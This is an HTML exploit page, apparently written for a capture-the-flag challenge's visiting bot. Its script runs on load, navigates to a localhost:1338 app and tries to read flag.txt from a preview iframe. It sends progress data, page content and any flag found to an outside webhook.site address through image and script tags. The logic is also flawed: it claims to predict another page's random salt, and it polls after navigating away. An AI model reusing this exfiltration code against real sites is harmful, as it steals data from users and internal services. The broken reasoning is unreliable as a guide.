<!DOCTYPE html>
<html>
<head>
    <title>Working Flag Extraction</title>
</head>
<body>
    <h1>Flag Extraction</h1>
    <div id="status">Extracting flag...</div>
    
    <script>
        const WEBHOOK_URL = 'https://webhook.site/eb547890-9955-4e02-a8ae-3083dba7c032';
        
        async function exfiltrateData(data) {
            const payload = typeof data === 'string' ? data : JSON.stringify(data);
            
            const img = new Image();
            img.src = `${WEBHOOK_URL}?data=${encodeURIComponent(payload)}`;
            document.body.appendChild(img);
            
            const script = document.createElement('script');
            script.src = `${WEBHOOK_URL}?callback=x&data=${encodeURIComponent(payload)}`;
            document.head.appendChild(script);
        }
        
        // Include the utility functions from the challenge
        function getRandom(n) {
            return Array.from(Array(n), Math.random).map(e=>e.toString(36).slice(2)).join('');
        }
        
        // Initialize the global variable (from util.js)
        mathRandomInvocations = [];
        
        async function extractFlag() {
            await exfiltrateData({
                status: 'extraction_started',
                timestamp: new Date().toISOString()
            });
            
            try {
                // The key insight: We need to navigate to localhost:1338 to access the flag
                // But we can predict the salt that will be used!
                
                // When the bot added the flag, it used cached: false
                // This means it called getRandom(5) and stored it in mathRandomInvocations
                // We can predict this by calling getRandom(5) ourselves!
                
                const predictedSalt = getRandom(5);
                mathRandomInvocations.push(predictedSalt);
                
                await exfiltrateData({
                    predicted_salt: predictedSalt,
                    message: 'Predicted salt for flag file'
                });
                
                // Now navigate to localhost:1338 to access the flag with our predicted salt
                setTimeout(() => {
                    window.location.href = 'http://localhost:1338';
                }, 2000);
                
                // Set up a check for when we're on localhost:1338
                const checkForFlag = setInterval(async () => {
                    if (window.location.hostname === 'localhost' && window.location.port === '1338') {
                        clearInterval(checkForFlag);
                        
                        await exfiltrateData({
                            status: 'navigated_to_localhost',
                            current_url: window.location.href
                        });
                        
                        // Now we're on the main app, look for the flag file
                        const filesList = document.querySelector('#filesList');
                        if (filesList) {
                            const flagFile = Array.from(filesList.children).find(
                                el => el.dataset.name === 'flag.txt'
                            );
                            
                            if (flagFile) {
                                await exfiltrateData({
                                    message: 'Found flag file, clicking it'
                                });
                                
                                flagFile.click();
                                
                                // Wait for flag to load in preview iframe
                                setTimeout(async () => {
                                    const previewIframe = document.querySelector('#previewIframe');
                                    if (previewIframe) {
                                        try {
                                            const flagContent = previewIframe.contentDocument.body.innerText;
                                            if (flagContent && flagContent.includes('CTF{')) {
                                                await exfiltrateData({
                                                    flag: flagContent,
                                                    method: 'direct_navigation_success',
                                                    timestamp: new Date().toISOString()
                                                });
                                                
                                                await exfiltrateData(flagContent);
                                                
                                                document.body.innerHTML = 
                                                    `<h1 style="color: green;">FLAG SENT: ${flagContent}</h1>`;
                                            }
                                        } catch (e) {
                                            await exfiltrateData({
                                                error: 'SafeFrame access failed',
                                                details: e.message
                                            });
                                        }
                                    }
                                }, 3000);
                            } else {
                                await exfiltrateData({
                                    error: 'Flag file not found',
                                    available_files: Array.from(filesList.children).map(el => el.dataset.name)
                                });
                            }
                        } else {
                            await exfiltrateData({
                                error: 'Files list not found',
                                page_content: document.body.innerHTML.substring(0, 500)
                            });
                        }
                    }
                }, 1000);
                
                // Stop checking after 30 seconds
                setTimeout(() => clearInterval(checkForFlag), 30000);
                
            } catch (error) {
                await exfiltrateData({
                    error: 'extraction_failed',
                    details: error.message
                });
            }
        }
        
        // Start extraction
        extractFlag();
    </script>
</body>
</html>
